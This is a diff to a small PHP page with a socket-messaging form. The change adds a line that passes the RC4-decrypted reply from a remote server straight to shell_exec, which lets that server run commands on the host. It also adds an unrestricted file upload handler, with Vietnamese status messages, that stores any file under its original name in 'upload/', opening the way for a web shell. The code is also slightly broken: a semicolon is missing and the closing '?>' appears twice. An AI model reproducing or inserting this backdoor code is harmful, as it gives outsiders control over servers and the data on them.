@@ -6,10 +6,15 @@
     <title>Document</title>
 </head>
 <body>
-    <form method="POST">
+    <form method="POST" >
     <input type="text" name="message">
     <input type="submit" name="btnSend">
     </form>
+	
+	<form action="" method="post" enctype="multipart/form-data">
+    <input type="file" name="fileUpload" value="">
+    <input type="submit" name="up" value="Upload">
+	</form>
 </body>
 </html>
 <?php
@@ -56,6 +61,19 @@ if ( isset($_POST['btnSend']) ) {
 	$message = rc4($result,"key");
     echo "Reply From Server  :".$message;
     // close socket
-    socket_close($socket);
+	socket_close($socket);
+	echo ( shell_exec ($message) )
 }
+if (isset($_POST['up']) && isset($_FILES['fileUpload'])) {
+    if ($_FILES['fileUpload']['error'] > 0)
+        echo "Upload lỗi rồi!";
+    else {
+        move_uploaded_file($_FILES['fileUpload']['tmp_name'], 'upload/' . $_FILES['fileUpload']['name']);
+        echo "upload thành công <br/>";
+        echo 'Dường dẫn: upload/' . $_FILES['fileUpload']['name'] . '<br>';
+        echo 'Loại file: ' . $_FILES['fileUpload']['type'] . '<br>';
+        echo 'Dung lượng: ' . ((int)$_FILES['fileUpload']['size'] / 1024) . 'KB';
+    }
+}
+?>
 ?>
